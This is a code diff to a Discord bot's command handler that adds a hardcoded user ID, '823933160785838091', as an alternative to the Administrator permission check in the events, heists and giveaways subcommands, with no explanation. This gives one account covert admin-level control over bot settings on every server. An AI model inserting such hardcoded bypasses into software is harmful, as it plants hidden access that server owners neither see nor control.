@@ -69,7 +69,10 @@ module.exports = {
     //EVENTS
     if (subcommand === "events") {
       if (
-        interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) ||
+        interaction.user.id == "823933160785838091"
       ) {
         let serverProfile;
         try {
@@ -173,7 +176,10 @@ Confirm that you would like to switch this role to ${data.role} using the intera
     //HEISTS
     if (subcommand === "heists") {
       if (
-        interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) ||
+        interaction.user.id == "823933160785838091"
       ) {
         let serverProfile;
         try {
@@ -276,7 +282,10 @@ Confirm that you would like to switch this role to ${data.role} using the intera
     //GIVEAWAYS
     if (subcommand === "giveaways") {
       if (
-        interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) ||
+        interaction.user.id == "823933160785838091"
       ) {
         let serverProfile;
         try {
